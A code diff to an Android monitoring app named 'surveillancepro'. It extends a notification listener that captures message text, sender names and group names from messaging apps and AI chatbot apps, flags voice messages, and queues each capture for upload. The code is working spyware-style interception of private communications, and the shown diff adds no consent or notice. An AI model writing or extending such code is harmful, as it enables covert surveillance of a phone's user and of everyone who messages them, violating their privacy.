@@ -2,19 +2,16 @@ package com.surveillancepro.android.services
 
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
-import com.surveillancepro.android.data.ApiClient
 import com.surveillancepro.android.data.DeviceStorage
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.SupervisorJob
-import kotlinx.coroutines.launch
+import com.surveillancepro.android.data.EventQueue
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 
 class SupervisionNotificationListener : NotificationListenerService() {
 
-    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private var lastNotifKey = ""
+    private var lastNotifTime = 0L
 
     private val monitoredApps = mapOf(
         "com.whatsapp" to "WhatsApp",
@@ -32,6 +29,20 @@ class SupervisionNotificationListener : NotificationListenerService() {
         "com.discord" to "Discord",
         "com.skype.raider" to "Skype",
         "com.viber.voip" to "Viber",
+        // Chatbots IA
+        "com.openai.chatgpt" to "ChatGPT",
+        "com.google.android.apps.bard" to "Gemini",
+        "com.anthropic.claude" to "Claude",
+        // Autres
+        "com.tencent.mm" to "WeChat",
+        "jp.naver.line.android" to "Line",
+        "com.imo.android.imoim" to "Imo",
+    )
+
+    private val voiceMessagePatterns = listOf(
+        "message vocal", "voice message", "audio", "ptt",
+        "\uD83C\uDFA4", // microphone emoji
+        "message audio", "nota de voz", "sprachnachricht",
     )
 
     override fun onNotificationPosted(sbn: StatusBarNotification) {
@@ -46,25 +57,41 @@ class SupervisionNotificationListener : NotificationListenerService() {
         val text = extras.getCharSequence("android.text")?.toString() ?: ""
         val bigText = extras.getCharSequence("android.bigText")?.toString()
         val subText = extras.getCharSequence("android.subText")?.toString()
+        val infoText = extras.getCharSequence("android.infoText")?.toString()
 
-        if (text.isBlank() && (bigText == null || bigText.isBlank())) return
+        val messageContent = bigText ?: text
+        if (messageContent.isBlank()) return
+
+        // Déduplication par clé unique (app + sender + message content)
+        val notifKey = "$packageName|$title|${messageContent.take(100)}"
+        val now = System.currentTimeMillis()
+        if (notifKey == lastNotifKey && now - lastNotifTime < 2000) return
+        lastNotifKey = notifKey
+        lastNotifTime = now
 
         val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
+
+        val isVoiceMessage = voiceMessagePatterns.any {
+            messageContent.lowercase().contains(it) || text.lowercase().contains(it)
+        }
 
         val payload = mutableMapOf<String, Any>(
             "app" to appName,
             "packageName" to packageName,
             "sender" to title,
-            "message" to (bigText ?: text),
+            "message" to messageContent,
             "timestamp" to timestamp,
         )
         subText?.let { payload["group"] = it }
+        infoText?.let { payload["info"] = it }
+        if (isVoiceMessage) payload["isVoiceMessage"] = true
 
-        scope.launch {
-            try {
-                val api = ApiClient.getInstance(storage)
-                api.sendEvent("notification_message", payload)
-            } catch (_: Exception) {}
-        }
+        // Extraire le nombre de messages non lus si disponible
+        val number = sbn.notification.number
+        if (number > 0) payload["unreadCount"] = number
+
+        val queue = EventQueue.getInstance(applicationContext)
+        val eventType = if (isVoiceMessage) "voice_message" else "notification_message"
+        queue.enqueue(eventType, payload)
     }
 }
